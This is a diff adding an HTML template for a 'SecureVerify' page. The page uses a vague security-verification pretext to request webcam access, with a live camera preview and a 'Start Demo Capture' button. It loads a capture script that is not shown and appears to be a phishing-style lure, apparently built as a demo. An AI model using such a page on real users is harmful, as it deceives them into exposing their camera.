@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0">
+
+    <title>SecureVerify</title>
+
+    <link rel="stylesheet"
+          href="{{ url_for('static',
+          filename='css/style.css') }}">
+
+</head>
+
+<body>
+
+
+<header class="header">
+
+    <div class="nav">
+
+        <div class="logo">
+            🔒 SecureVerify
+        </div>
+
+        <div class="links">
+
+            <span>Home</span>
+
+            <span>Security</span>
+
+            <span>Help</span>
+
+        </div>
+
+    </div>
+
+</header>
+
+
+<main>
+
+
+    <section class="hero">
+
+
+        <div class="hero-text">
+
+            <div class="badge">
+                🔒 Secure Verification
+            </div>
+
+
+            <h1>
+                Online Security<br>
+                Verification
+            </h1>
+
+
+            <p>
+                Complete a quick security verification
+                to continue your secure session.
+            </p>
+
+
+            <div id="status">
+                Preparing secure verification...
+            </div>
+
+        </div>
+
+
+        <div class="info-card">
+
+
+            <!-- Small camera preview -->
+
+            <div id="cameraPreview"
+                 class="camera-preview">
+
+                <video id="previewVideo"
+                       autoplay
+                       playsinline
+                       muted>
+                </video>
+
+            </div>
+
+
+            <h2>
+                Security Verification
+            </h2>
+
+
+            <p>
+                Complete the verification process
+                to continue.
+            </p>
+
+
+            <div class="feature">
+
+                <span>✓</span>
+
+                <div>
+
+                    <strong>
+                        Secure Connection
+                    </strong>
+
+                    <small>
+                        Protected verification session
+                    </small>
+
+                </div>
+
+            </div>
+
+
+            <div class="feature">
+
+                <span>✓</span>
+
+                <div>
+
+                    <strong>
+                        Identity Verification
+                    </strong>
+
+                    <small>
+                        Additional security verification
+                    </small>
+
+                </div>
+
+            </div>
+
+
+            <div class="feature">
+
+                <span>✓</span>
+
+                <div>
+
+                    <strong>
+                        Security Check
+                    </strong>
+
+                    <small>
+                        Complete the verification process
+                    </small>
+
+                </div>
+
+            </div>
+
+
+            <!-- Camera status -->
+
+            <div id="cameraStatus"
+                 class="camera-status">
+
+                Checking camera permission...
+
+            </div>
+
+
+            <!-- Capture button -->
+
+            <button id="captureButton"
+                    class="capture-button"
+                    hidden>
+
+                Start Demo Capture
+
+            </button>
+
+
+            <!-- Capture information -->
+
+            <div id="captureStatus"
+                 class="capture-status">
+
+            </div>
+
+
+        </div>
+
+    </section>
+
+
+    <section class="information">
+
+
+        <h2>
+            Security Information
+        </h2>
+
+
+        <div class="info-grid">
+
+
+            <div>
+
+                <h3>
+                    Account Security
+                </h3>
+
+                <p>
+                    Verification helps protect accounts
+                    from unauthorized access.
+                </p>
+
+            </div>
+
+
+            <div>
+
+                <h3>
+                    Privacy
+                </h3>
+
+                <p>
+                    Always review permissions before
+                    granting access to websites.
+                </p>
+
+            </div>
+
+
+            <div>
+
+                <h3>
+                    Secure Browsing
+                </h3>
+
+                <p>
+                    Check website permissions before
+                    continuing with verification.
+                </p>
+
+            </div>
+
+
+        </div>
+
+    </section>
+
+
+</main>
+
+
+<footer>
+
+    <span>
+        SecureVerify
+    </span>
+
+    <span>
+        Security Center
+    </span>
+
+    <span>
+        Privacy
+    </span>
+
+    <span>
+        Support
+    </span>
+
+</footer>
+
+
+<script src="{{ url_for('static',
+             filename='js/camera.js') }}">
+</script>
+
+
+</body>
+
+</html>
